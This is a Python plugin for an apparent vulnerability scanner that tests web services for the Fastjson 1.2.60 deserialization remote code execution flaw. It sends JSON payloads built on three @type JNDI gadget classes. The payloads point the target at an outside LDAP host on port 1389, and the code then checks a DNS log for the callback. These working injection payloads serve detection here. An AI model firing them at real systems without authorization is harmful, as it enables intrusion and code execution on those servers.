import requests
from celery_app.utils.utils import have_record, get_dns_payload

from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#Fastjson <= 1.2.60 反序列化远程代码执行漏洞
plugin_id=90
default_port_list=web_port_short


def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    subdomain, payload_dns = get_dns_payload()
    uris = ['/', '/api', '/api/login', '/api/log', '/log']
    payloads = [
        {
            "gadget": "oracle.jdbc.connector.OracleManagedConnectionFactory",
            "data": {"@type": "oracle.jdbc.connector.OracleManagedConnectionFactory",
                     "xaDataSourceName": "ldap://{}:1389/Object".format(payload_dns)}
        },
        {
            "gadget": "org.apache.commons.configuration2.JNDIConfiguration",
            "data": {"@type": "org.apache.commons.configuration2.JNDIConfiguration",
                     "prefix": "ldap://{}:1389/Object".format(payload_dns)}
        },
        {
            "gadget": "org.apache.commons.configuration.JNDIConfiguration",
            "data": {"@type": "org.apache.commons.configuration.JNDIConfiguration",
                     "prefix": "ldap://{}:1389/Object".format(payload_dns)}
        }
    ]

    requests.packages.urllib3.disable_warnings()
    with requests.Session() as session:

        targets = ['{}{}'.format(target, uri) for uri in uris]
        for payload in payloads:
            for url in targets:
                try:
                    session.post(url, json=payload.get('data'), timeout=30, verify=False)
                except:
                    pass
        if have_record(subdomain):
            output = subdomain
            # output = 'gadget:\t{}\ndnslog:\t{}'.format(payload.get('gadget'), payload_str)
            insert_vuln_db(host, target, output, plugin_id)
            return True, host, target, output
    return False

